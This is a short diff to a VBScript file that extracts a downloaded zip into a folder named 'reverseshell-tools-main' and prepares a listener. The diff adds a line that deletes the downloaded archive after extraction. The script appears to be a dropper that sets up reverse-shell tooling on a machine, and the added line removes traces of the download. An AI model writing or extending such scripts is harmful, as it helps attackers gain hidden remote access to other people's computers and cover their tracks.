@@ -55,6 +55,8 @@ Dim zip, extract
 Set zip = OShell.NameSpace(Path + "\download.zip").Items
 OShell.NameSpace(Path).CopyHere(zip) , 16
 
+FSO.DeleteFile(Path + "\download.zip")
+
 Dim listener
 
 WShell.CurrentDirectory = Path + "\reverseshell-tools-main"
